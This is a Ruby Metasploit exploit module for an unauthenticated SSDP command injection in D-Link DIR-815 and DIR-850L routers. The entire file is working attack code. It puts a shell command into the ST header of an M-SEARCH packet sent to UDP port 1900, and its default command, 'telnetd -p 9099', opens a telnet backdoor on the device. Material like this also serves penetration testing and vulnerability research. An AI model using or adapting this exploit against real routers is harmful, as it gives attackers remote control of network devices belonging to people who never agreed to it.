require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link DIR-815,DIR-850L -SSDP Command Injection',
      'Description' => %q{
        DIR-815,850L and most of Dlink routers are susceptible to this flaw. This allows to perform command injection using SSDP packets and on UDP. So no authentication required. Just the fact that the attacker needs to be on wireless LAN or be able to fake a request coming from internal wireless LAN using some other mechanism.
      },
      'Author'      =>
        [
          'tyomcat' 
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['URL', 'https://www.exploit-db.com/exploits/38715/'] # original exploit
        ],
      'Privileged'     => false,
      'Targets' =>
        [
          [ 'D-link DIR-815',
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSLE
            }
          ],
          [ 'D-link DIR-850L', # unknown if there are big endian devices out there
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSBE
            }
          ]
        ],
      'DefaultTarget'  => 0
      ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(1900),
    OptString.new('CMD',[true,'The command to exec','telnetd -p 9099'])
      ], self.class)

  end

  def exploit

    print_status("#{rhost} - 命令执行中 bi bi bi  ...")
    configure_socket

    pkt =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:#{peer}\r\n" +
      "ST:urn:schemas-upnp-org:service:WANIPConnection:1;#{cmd}\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"

    udp_sock.sendto(pkt, rhost, rport, 0)
  end

  def configure_socket
    self.udp_sock = Rex::Socket::Udp.create({
      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
    })
    add_socket(self.udp_sock)
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def cmd
    datastore['CMD']
  end

  def peer
    "#{rhost}:#{rport}"
  end

  attr_accessor :udp_sock

end
